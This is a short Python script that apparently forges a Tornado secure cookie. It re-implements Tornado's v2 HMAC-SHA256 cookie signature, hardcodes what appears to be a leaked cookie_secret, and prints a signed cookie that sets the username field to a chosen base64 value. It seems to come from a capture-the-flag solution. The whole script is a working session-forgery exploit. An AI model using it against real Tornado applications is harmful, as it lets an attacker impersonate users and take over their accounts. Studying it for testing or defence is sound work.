
import hmac
import hashlib

# https://github.com/tornadoweb/tornado/blob/eb487cac3d829292ecca6e5124b1da5ae6bba407/tornado/web.py

def _create_signature_v2(secret, s):
    hash = hmac.new((secret).encode("utf-8"), digestmod=hashlib.sha256)
    hash.update((s).encode("utf-8"))
    return (hash.hexdigest())

def genecookie(s):
    print(s+_create_signature_v2("JDIOtOQQjLXklJT/N4aJE.tmYZ.IoK9M0_IHZW448b6exe7p1pysO",s))


genecookie("2|1:0|10:1528524163|8:username|8:eW55eW4=|")